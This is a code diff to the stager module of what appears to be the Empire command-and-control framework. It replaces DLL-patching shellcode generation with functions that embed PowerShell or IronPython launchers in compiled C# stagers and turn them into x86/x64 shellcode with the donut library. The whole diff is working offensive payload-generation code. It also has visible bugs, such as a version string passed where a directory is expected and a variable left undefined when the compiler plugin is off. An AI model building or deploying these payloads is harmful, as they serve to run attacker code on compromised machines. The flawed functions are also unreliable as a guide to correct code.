@@ -17,6 +17,7 @@ from __future__ import absolute_import
 from __future__ import division
 from __future__ import print_function
 
+import donut
 import base64
 import errno
 import fnmatch
@@ -37,7 +38,6 @@ from past.utils import old_div
 from empire.server.database import models
 from empire.server.database.base import Session
 from . import helpers
-from .ShellcodeRDI import *
 
 
 class Stagers(object):
@@ -165,38 +165,74 @@ class Stagers(object):
         else:
             print(helpers.color("[!] Original .dll for arch %s does not exist!" % (arch)))
 
-    def generate_shellcode(self, poshCode, arch):
+    def generate_powershell_exe(self, posh_code, dot_net_version='net40'):
         """
-        Generate shellcode using monogas's sRDI python module and the PowerPick reflective DLL
+        Generate powershell launcher embedded in csharp
         """
-        if arch.lower() == 'x86':
-            origPath = "{}/data/misc/x86_slim.dll".format(self.mainMenu.installPath)
+        with open(self.mainMenu.installPath + "/stagers/CSharpPS.yaml", "rb") as f:
+            stager_yaml = f.read()
+        stager_yaml = stager_yaml.decode("UTF-8")
+        posh_code = base64.b64encode(posh_code.encode("UTF-16LE")).decode("UTF-8")
+        stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
+
+        compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+        if not compiler.status == 'ON':
+            print(helpers.color('[!] csharpserver plugin not running'))
         else:
-            origPath = "{}/data/misc/x64_slim.dll".format(self.mainMenu.installPath)
+            file_name = compiler.do_send_stager(stager_yaml, "CSharpPS")
 
-        if os.path.isfile(origPath):
+        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
+        return directory
 
-            dllRaw = ''
-            with open(origPath, 'rb') as f:
-                dllRaw = f.read()
+    def generate_powershell_shellcode(self, posh_code, arch='both', dot_net_version='net40'):
+        """
+        Generate powershell shellcode using donut python module
+        """
+        if arch == 'x86':
+            arch_type = 1
+        elif arch == 'x64':
+            arch_type = 2
+        elif arch == 'both':
+            arch_type = 3
 
-                replacementCode = helpers.decode_base64(poshCode)
-                # patch the dll with the new PowerShell code
-                searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
-                index = dllRaw.find(searchString)
-                dllPatched = dllRaw[:index]+replacementCode+dllRaw[(index+len(replacementCode)):]
+        directory = self.generate_powershell_exe(posh_code, dot_net_version)
+        shellcode = donut.create(file=directory, arch=arch_type)
+        return shellcode
 
-                flags = 0
-                flags |= 0x1
+    def generate_python_exe(self, posh_code, directory, dot_net_version='net40'):
+        """
+        Generate ironpython launcher embedded in csharp
+        """
+        with open(self.mainMenu.installPath + "/stagers/CSharpPy.yaml", "rb") as f:
+            stager_yaml = f.read()
+        stager_yaml = stager_yaml.decode("UTF-8")
+        posh_code = base64.b64encode(posh_code.encode("UTF-8")).decode("UTF-8")
+        stager_yaml = stager_yaml.replace("{{ REPLACE_LAUNCHER }}", posh_code)
+        stager_yaml = stager_yaml.replace("{{ REPLACE_DIRECTORY }}", directory)
 
-                sc = ConvertToShellcode(dllPatched)
-
-                return sc
-
+        compiler = self.mainMenu.loadedPlugins.get("csharpserver")
+        if not compiler.status == 'ON':
+            print(helpers.color('[!] csharpserver plugin not running'))
         else:
-            print(helpers.color("[!] Original .dll for arch {} does not exist!".format(arch)))
+            file_name = compiler.do_send_stager(stager_yaml, "CSharpPy")
 
+        directory = f"{self.mainMenu.installPath}/csharp/Covenant/Data/Tasks/CSharp/Compiled/{dot_net_version}/{file_name}.exe"
+        return directory
 
+    def generate_python_shellcode(self, posh_code, arch='both', dot_net_version='net40'):
+        """
+        Generate ironpython shellcode using donut python module
+        """
+        if arch == 'x86':
+            arch_type = 1
+        elif arch == 'x64':
+            arch_type = 2
+        elif arch == 'both':
+            arch_type = 3
+
+        directory = self.generate_python_exe(posh_code, dot_net_version)
+        shellcode = donut.create(file=directory, arch=arch_type)
+        return shellcode
 
     def generate_macho(self, launcherCode):
         """
